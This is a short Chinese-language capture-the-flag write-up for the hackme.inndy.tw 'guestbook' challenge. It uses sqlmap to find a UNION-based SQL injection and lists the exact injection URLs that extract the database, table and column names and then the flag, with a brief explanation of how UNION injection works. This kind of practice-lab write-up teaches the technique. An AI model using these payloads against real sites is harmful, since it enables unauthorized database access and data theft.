# inndy web guestbook
* [題目網址](https://hackme.inndy.tw/gb)
1. 用 sqlmap 掃每個網址，最後發現 sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&id=10" 時出現有 UNION BASE SQL INJECTION，且欄位數目 4 個
2. 開始利用此漏洞得到 database name, table name, column name...
```
# 得到 database name 為 g8:
https://hackme.inndy.tw/gb/?mod=read&id=10 UNION SELECT 1, 2, 3, DATABASE()--

# 得到 table name 為 flag:
https://hackme.inndy.tw/gb/?mod=read&id=10 UNION SELECT 1, 2, 3, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='g8'--

# 得到 column name flag:
https://hackme.inndy.tw/gb/?mod=read&id=10 UNION SELECT 1, 2, 3, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='g8' AND TABLE_NAME='flag' AND COLUMN_NAME LIKE '%la%'--

# 得到 flag:
https://hackme.inndy.tw/gb/?mod=read&id=10 UNION SELECT 1, 2, 3, flag FROM flag WHERE flag LIKE '%FLAG%'--;
```

* UNION BASE SQL INJECTION 原理:
UNION 在 SQL 語法中是用來合併查詢用的，把 UNION 後面的查詢結果接在前面查詢結果的後面，所以 COLUMN 數量也必須一樣，超過會出錯。
* [sqlmap 教學](http://www.vuln.cn/1992)